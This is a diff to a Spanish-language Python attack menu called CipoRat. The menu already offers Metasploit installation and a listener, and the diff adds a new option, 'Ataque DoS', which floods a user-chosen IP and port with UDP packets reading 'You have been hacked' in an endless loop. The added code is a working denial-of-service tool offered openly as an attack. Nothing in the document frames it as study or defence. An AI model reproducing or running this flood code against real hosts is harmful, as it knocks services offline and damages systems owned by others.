@@ -2,6 +2,7 @@
 #@@Thanks for your help Null@@
 
 import os
+import socket
 import time
 import colorama
 from colorama import Fore, Back, Style
@@ -14,7 +15,7 @@ def menu():
 
     clear()
 
-    print(r"""
+    print(Fore.WHITE+r"""
         #############################################################
         #                  -=\\`\\                                  #
         #              |\\ ____\\_\\__                              #
@@ -50,7 +51,8 @@ def menu():
     print("4 - Instalar metasploit")
     print("5 - Abrir listener en metasploit")
     print("6 - Actualizar CipoRat")
-    print("7 - Salir\n")
+    print("7 - Ataque DoS (Mediante el protocolo UDP)")
+    print("8 - Salir\n")
 
     opcion= int(input("Selecciona una opción: "))
     if opcion == 1:
@@ -66,6 +68,8 @@ def menu():
     if opcion == 6:
         funcion6()
     if opcion == 7:
+        funcion7()
+    if opcion == 8:
         exit()
 
     else:
@@ -186,7 +190,19 @@ def funcion6():
 
     os.system("python3 actualizar.py" if os.name == "nt" else "python3 actualizar.py")
 
+def funcion7():
 
+    clear()
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent = 0
+    ip = input("Escribe la dirección ip: ")
+    puerto = int(input("Escribe el puerto: "))
+
+    while True:
+        s.sendto ("You have been hacked".encode(), (ip, puerto))
+        sent = sent + 1
+        print ("{} paquetes enviados".format(sent))
 
 def opcion1():
 
